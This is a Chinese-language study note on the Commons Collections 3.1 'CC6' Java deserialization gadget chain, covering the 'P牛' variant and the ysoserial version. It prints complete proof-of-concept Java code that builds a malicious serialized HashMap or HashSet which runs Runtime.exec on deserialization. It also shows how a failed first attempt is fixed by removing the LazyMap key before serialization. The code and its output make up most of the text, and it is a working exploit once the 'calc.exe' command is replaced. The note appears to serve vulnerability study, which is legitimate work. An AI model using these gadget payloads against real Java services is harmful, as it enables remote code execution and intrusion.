### P牛的链

#### 简介

* CC6还是使用的LazyMap
* 高版本java可用，实测过：1.8.0_66 1.8.0_261 11.0.18 17.0.11等版本
* commons-collections:3.1 

利用链如下

```java
/*
 Gadget chain:
 java.io.ObjectInputStream.readObject()
 java.util.HashMap.readObject()
 java.util.HashMap.hash()
 
org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 
org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 org.apache.commons.collections.map.LazyMap.get()
 
org.apache.commons.collections.functors.ChainedTransformer.transform()
 
org.apache.commons.collections.functors.InvokerTransformer.transform()
 java.lang.reflect.Method.invoke()
 java.lang.Runtime.exec()
*/
```

#### 不成功的链

先给出初步的poc代码

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonCollection6 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new
                        Object[] { "getRuntime",

                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new
                        Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "calc.exe" }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        Field f =
                ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);
        // ==================
        // ⽣成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();
        // 本地测试触发
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}

```

cc6还是利用的LazyMap，在cc1中分析过，是通过LazyMap#get方法触发的漏洞，所以我们从readObject入口点开始需要一步一步找到LazyMap#get方法。

```java
// HashMap的readObject作为入口点
private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor <= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException("Illegal load factor: " +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings < 0)
        throw new InvalidObjectException("Illegal mappings count: " +
                                         mappings);
    else if (mappings > 0) { // (if zero, use defaults)
        // Size the table using given load factor only if within
        // range of 0.25...4.0
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                   DEFAULT_INITIAL_CAPACITY :
                   (fc >= MAXIMUM_CAPACITY) ?
                   MAXIMUM_CAPACITY :
                   tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);
        @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
                K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V) s.readObject();
            // 关键操作，key为TiedMapEntry tme
            putVal(hash(key), key, value, false, false);
        }
    }
}

// 追溯HashMap#hash(key)
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}

// 追溯TiedMapEntry#hashcode
public int hashCode() {
    Object value = getValue();
    return (getKey() == null ? 0 : getKey().hashCode()) ^
           (value == null ? 0 : value.hashCode()); 
}

// 追溯追溯TiedMapEntry#getValue
public Object getValue() {
    return map.get(key);
}

```

到这里就触发了LazyMap#get，但是运行这段poc代码实际上没有弹出计算机

#### 改进

前面代码没有运行成功的原因是我们忽略了LazyMap#get触发漏洞的条件

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

只有当`if(map.containsKey==false)`条件被满足时，才会进入执行`factory.transform(key)`，在我们构造gadget时，注意到这个操作`expMap.put(tme, "valuevalue")`，原本该操作是为了给HashMap添加键值对，在readObject时能够触发相关操作，但是查看该方法的操作

```java
public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
```

这里已经提前执行过一次HashMap#put，这造成了什么后果呢，就是在生成恶意序列化对象前我们就触发了恶意操作，在此时执行到LazyMap#get时，进入if执行`map.put(key, value)`，所以在反序列化的时候再次执行LazyMap#get时，就不会进入if执行代码，而是直接`return map.get(key)`。

改进的poc代码就是在生成序列化对象前，将`map.put(key, value)`添加的键值对移除

```java
// .......
Transformer transformerChain = new ChainedTransformer(fakeTransformers);

Map innerMap = new HashMap();
Map outerMap = LazyMap.decorate(innerMap, transformerChain);

TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
Map expMap = new HashMap();
expMap.put(tme, "valuevalue");

// 移除添加的键值对
outerMap.remove("keykey");

Field f =
        ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(transformerChain, transformers);

// .......
```

### ysoserial链

为了便于分析，这里简化了一下，但是利用链和ysoserial是完全一样的

```java
Transformer[] fakeTransformers = new Transformer[] {new
        ConstantTransformer(1)};
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] { String.class,
                Class[].class }, new
                Object[] { "getRuntime",

                new Class[0] }),
        new InvokerTransformer("invoke", new Class[] { Object.class,
                Object[].class }, new
                Object[] { null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] { String.class },
                new String[] { "calc.exe" }),
        new ConstantTransformer(1),
};
Transformer transformerChain = new ChainedTransformer(fakeTransformers);

Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

TiedMapEntry tme = new TiedMapEntry(lazyMap, "foo");

HashSet map = new HashSet();
map.add(tme);
lazyMap.remove("foo");

Field f =
        ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(transformerChain, transformers);

// ==================
// ⽣成序列化字符串
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(map);
oos.close();
// 本地测试触发
System.out.println(barr);
ObjectInputStream ois = new ObjectInputStream(new
        ByteArrayInputStream(barr.toByteArray()));
Object o = (Object)ois.readObject();
```

这里同样有`lazyMap.remove("foo")`，因为`map.add(tme)`执行了`hash(tme)`，ysoserial的原始poc代码没有remove是因为它是直接通过反射设置的属性

调用链如下，P牛的链相对于ysoserial来说，在入口点java.util.HashMap.readObject()中直接调用了java.util.HashMap.hash()

```java
/*
 Gadget chain:
 java.io.ObjectInputStream.readObject()
 java.util.HashSet.readObject()
 java.util.HashMap.put()
 java.util.HashMap.hash()
 
org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 
org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 org.apache.commons.collections.map.LazyMap.get()
 
org.apache.commons.collections.functors.ChainedTransformer.transform()
 
org.apache.commons.collections.functors.InvokerTransformer.transform()
 java.lang.reflect.Method.invoke()
 java.lang.Runtime.exec()
*/
```

